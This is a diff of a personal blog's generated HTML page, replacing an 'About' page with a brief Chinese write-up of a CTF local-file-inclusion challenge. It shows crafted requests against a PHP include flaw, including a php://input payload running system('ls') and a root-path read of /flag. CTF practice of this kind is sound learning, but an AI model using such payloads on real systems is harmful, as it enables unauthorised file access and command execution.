@@ -5,12 +5,17 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ExceptionB`s Small Room</title>
+    <title>BUU-LFI-COURSE-1 - ExceptionB`s Small Room</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="Blog,"> 
-    
+    <meta name="description" content="有一说一，看到这个题目的这一行
+1include $_GET[&amp;#x27;file&amp;#x27;]
+感觉就是要在查询字符串上动手脚
+先请求
+1GET /?file=flag HTTP/1.1
+报错 N,"> 
     <meta name="author" content="ExceptionB Ch. (aka 鲤唐可可)"> 
     <link rel="alternative" href="atom.xml" title="ExceptionB`s Small Room" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -18,16 +23,26 @@
     
     
     <meta name="twitter:card" content="summary"/>
-    <meta name="twitter:title" content="ExceptionB`s Small Room"/>
-    
+    <meta name="twitter:title" content="BUU-LFI-COURSE-1 - ExceptionB`s Small Room"/>
+    <meta name="twitter:description" content="有一说一，看到这个题目的这一行
+1include $_GET[&amp;#x27;file&amp;#x27;]
+感觉就是要在查询字符串上动手脚
+先请求
+1GET /?file=flag HTTP/1.1
+报错 N,"/>
     
     
     
     
     <meta property="og:site_name" content="ExceptionB`s Small Room"/>
     <meta property="og:type" content="object"/>
-    <meta property="og:title" content="ExceptionB`s Small Room"/>
-    
+    <meta property="og:title" content="BUU-LFI-COURSE-1 - ExceptionB`s Small Room"/>
+    <meta property="og:description" content="有一说一，看到这个题目的这一行
+1include $_GET[&amp;#x27;file&amp;#x27;]
+感觉就是要在查询字符串上动手脚
+先请求
+1GET /?file=flag HTTP/1.1
+报错 N,"/>
     
 <link rel="stylesheet" href="/css/diaspora.css">
 
@@ -40,44 +55,91 @@
 <body class="loading">
     <span id="config-title" style="display:none">ExceptionB`s Small Room</span>
     <div id="loader"></div>
-    <div id="single" class="page">
-    <div id="top">
-        <a class="iconfont icon-left image-icon" href="javascript:history.back()"></a>
-    </div>
-    <div class="section">
-        <div class="article">
-            <div class="main">
-                <div class="content">
-                
-                        <h1 id="About"><a href="#About" class="headerlink" title="About"></a>About</h1><p><em><strong>Under construction</strong></em></p>
-<h2 id="Who-am-I"><a href="#Who-am-I" class="headerlink" title="Who am I?"></a>Who am I?</h2><p><del>18岁，是学生</del><br><del>爱打游戏，二次元desu</del></p>
-<h2 id="这里主要会放些什么？"><a href="#这里主要会放些什么？" class="headerlink" title="这里主要会放些什么？"></a>这里主要会放些什么？</h2><p><strong>我不好说</strong>，<del>想到什么放什么啊</del><br>大概率，你会看到如下内容：</p>
-<ol>
-<li>一些<strong>代码</strong>相关的杂七杂八的东西</li>
-<li>可能会有一些对周围的<strong>吐槽</strong></li>
-<li><strong>二次元</strong>（超大声）</li>
-</ol>
-<h2 id="还可以在哪里找到我？"><a href="#还可以在哪里找到我？" class="headerlink" title="还可以在哪里找到我？"></a>还可以在哪里找到我？</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/ExceptionB/">GitHub</a>： <em>@ExceptionB</em></li>
-<li><a target="_blank" rel="noopener" href="https://space.bilibili.com/13844261">BiliBili</a>： <em>@大杯柠檬cha</em></li>
-</ul>
-<h2 id="本站使用的一些资源"><a href="#本站使用的一些资源" class="headerlink" title="本站使用的一些资源"></a>本站使用的一些资源</h2><h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><p>本博客使用<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></p>
-<h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p>本博客使用由<a target="_blank" rel="noopener" href="https://github.com/Fechin">Fechin</a>移植的<a target="_blank" rel="noopener" href="https://github.com/Fechin/hexo-theme-diaspora">Diaspora</a></p>
-<h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><h4 id="来自pixiv-net的图片"><a href="#来自pixiv-net的图片" class="headerlink" title="来自pixiv.net的图片"></a>来自pixiv.net的图片</h4><ul>
-<li><a target="_blank" rel="noopener" href="https://www.pixiv.net/artworks/56498311">封面1</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.pixiv.net/artworks/57793944">封面2</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.pixiv.net/artworks/85035229">封面3</a></li>
-</ul>
-<h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>【<strong>2022-08-09 15:14:42</strong>】<br>终于终于终于，我终于开始决定写这个blog啦</p>
-<p>【<strong>2022-08-09 16:13:50</strong>更新】<br>GitHub的自定义域名，往repo里面新建了一个文件”CNAME”，但是本地没有……每次deploy都会把”CNAME”给删掉……焯！</p>
-
-                
-                </div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://ray.akarin.tk"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">BUU-LFI-COURSE-1</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
             </div>
+            <div id="qr"></div>
         </div>
     </div>
+    <div class="scrollbar"></div>
 </div>
 
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">BUU-LFI-COURSE-1</h1>
+        <div class="stuff">
+            <span>十月 01, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>有一说一，看到这个题目的这一行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $_GET[&#x27;file&#x27;]</span><br></pre></td></tr></table></figure>
+<p>感觉就是要在查询字符串上动手脚</p>
+<p>先请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=flag HTTP/1.1</span><br></pre></td></tr></table></figure>
+<p>报错 No such file or directory</p>
+<p>想过可能文件名是奇奇怪怪的东西，于是又试了一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=php://input HTTP/1.1</span><br><span class="line"></span><br><span class="line">&lt;?php system(&#x27;ls&#x27;)?&gt;</span><br></pre></td></tr></table></figure>
+<p>还是失败 (yysy, 这段是我网上抄的，但是莫名其妙不能用)</p>
+<p>又想到，上一道题的flag就是放在根目录的，于是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=/flag HTTP/1.1</span><br></pre></td></tr></table></figure>
+<p>出来了</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
 </body>
 
 
